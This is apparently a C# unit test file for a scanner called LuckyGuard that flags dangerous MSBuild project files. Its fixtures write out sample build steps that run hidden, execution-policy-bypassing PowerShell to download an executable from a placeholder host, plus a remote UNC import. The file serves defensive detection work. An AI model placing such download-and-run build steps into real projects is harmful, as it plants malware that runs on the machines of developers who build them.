using LuckyGuard.Core.Detection;
using LuckyGuard.MSBuild.Analysis;

namespace LuckyGuard.Tests;

public sealed class MsBuildFileAnalyzerTests
{
    [Fact]
    public void HiddenDownloaderChain_IsHigh()
    {
        string dir = TestDir();
        try
        {
            string project = Path.Combine(dir, "bad.csproj");
            File.WriteAllText(project, """
<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="BeforeBuild">
    <Exec Command="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand AAA Invoke-WebRequest https://example.invalid/a -OutFile %TEMP%\\x.exe" />
  </Target>
</Project>
""");
            var result = new MsBuildFileAnalyzer().Analyze([project], dir);
            var finding = Assert.Single(result.Findings, x => x.Id == "LW.MSBUILD.SUSPICIOUS_EXECUTION_CHAIN");
            Assert.Equal(DetectionSeverity.High, finding.Severity);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void LegitimateCopyExec_DoesNotTrigger()
    {
        string dir = TestDir();
        try
        {
            string project = Path.Combine(dir, "clean.csproj");
            File.WriteAllText(project, "<Project><Target Name=\"AfterBuild\"><Exec Command=\"copy a.txt b.txt\" /></Target></Project>");
            var result = new MsBuildFileAnalyzer().Analyze([project], dir);
            Assert.Empty(result.Findings);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void RemoteImport_IsHigh()
    {
        string dir = TestDir();
        try
        {
            string project = Path.Combine(dir, "remote.csproj");
            File.WriteAllText(project, "<Project><Import Project=\"\\\\server\\share\\custom.targets\" /></Project>");
            var result = new MsBuildFileAnalyzer().Analyze([project], dir);
            Assert.Contains(result.Findings, x => x.Id == "LG.MSBUILD.REMOTE_IMPORT" && x.Severity == DetectionSeverity.High);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void LocalImport_IsFollowed()
    {
        string dir = TestDir();
        try
        {
            string imported = Path.Combine(dir, "custom.targets");
            File.WriteAllText(imported, "<Project><Target Name=\"X\"><Exec Command=\"powershell -EncodedCommand AAA Invoke-WebRequest https://example.invalid/a\" /></Target></Project>");
            string project = Path.Combine(dir, "app.csproj");
            File.WriteAllText(project, "<Project><Import Project=\"custom.targets\" /></Project>");
            var result = new MsBuildFileAnalyzer().Analyze([project], dir);
            Assert.Equal(1, result.ImportsFollowed);
            Assert.Contains(result.Findings, x => x.Category == DetectionCategory.MSBuild);
        }
        finally { Directory.Delete(dir, true); }
    }

    private static string TestDir()
    {
        string dir = Path.Combine(Path.GetTempPath(), "LuckyGuardTests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        return dir;
    }
}
